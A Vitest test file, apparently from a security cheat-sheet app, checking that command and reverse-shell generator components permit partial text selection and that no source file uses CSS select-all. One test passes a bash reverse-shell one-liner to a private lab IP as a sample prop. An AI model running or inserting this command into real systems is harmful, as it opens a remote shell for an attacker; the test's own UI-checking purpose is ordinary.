import fs from 'node:fs';
import path from 'node:path';
import { describe, it, expect } from 'vitest';
import { render } from '@testing-library/react';
import { SyntaxHighlightedCommand } from '../../components/common/SyntaxHighlightedCommand';
import { ReverseShellGenerator } from '../../components/cheatsheet/ReverseShellGenerator';

const SRC_DIR = path.resolve(__dirname, '..', '..');

function walkSourceFiles(dir: string, out: string[] = []): string[] {
  for (const entry of fs.readdirSync(dir, { withFileTypes: true })) {
    const full = path.join(dir, entry.name);
    if (entry.isDirectory()) {
      if (entry.name === 'test') continue;
      walkSourceFiles(full, out);
    } else if (/\.(tsx?|css)$/.test(entry.name) && !/\.test\.tsx?$/.test(entry.name)) {
      out.push(full);
    }
  }
  return out;
}

describe('partial text selection across payloads and commands', () => {
  it('never uses CSS select-all / user-select: all in app source files', () => {
    const offenders: string[] = [];
    for (const file of walkSourceFiles(SRC_DIR)) {
      const text = fs.readFileSync(file, 'utf8');
      if (/\bselect-all\b|user-select:\s*all\b/.test(text)) {
        offenders.push(path.relative(SRC_DIR, file).replace(/\\/g, '/'));
      }
    }
    expect(offenders).toEqual([]);
  });

  it('allows partial selection on SyntaxHighlightedCommand', () => {
    const { container } = render(<SyntaxHighlightedCommand command="bash -i >& /dev/tcp/10.10.14.5/4444 0>&1" />);
    const span = container.firstElementChild as HTMLElement;
    expect(span.className).toContain('select-text');
    expect(span.className).not.toContain('select-all');
  });

  it('allows partial selection on ReverseShellGenerator payload and listener', () => {
    const { container } = render(<ReverseShellGenerator />);
    const pre = container.querySelector('pre');
    const code = container.querySelector('code');
    expect(pre).not.toBeNull();
    expect(code).not.toBeNull();
    expect(pre!.className).toContain('select-text');
    expect(pre!.className).not.toContain('select-all');
    expect(code!.className).toContain('select-text');
    expect(code!.className).not.toContain('select-all');
  });
});
